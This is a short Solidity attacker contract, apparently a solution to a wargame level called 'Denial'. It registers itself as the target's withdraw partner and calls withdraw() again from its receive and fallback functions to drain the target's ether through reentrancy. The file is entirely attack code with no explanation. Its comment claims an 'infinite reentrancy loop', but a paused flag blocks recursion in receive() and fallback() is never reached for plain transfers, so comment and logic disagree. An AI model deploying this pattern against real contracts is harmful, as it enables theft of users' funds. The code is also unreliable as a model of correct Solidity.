pragma solidity ^0.8.0;

contract DrainReEntrant {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
        Denial(_denial).setWithdrawPartner(address(this));
    }

    receive() external payable {
        // Infinite reentrancy loop to drain all funds
        if (address(denial).balance >= 1 wei && !paused) {
            paused = true;
            Denial(denial).withdraw();
            paused = false;
        }
    }

    fallback() external payable {
        if (address(denial).balance >= 1 wei) {
            Denial(denial).withdraw();
        }
    }

    bool paused;
}

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}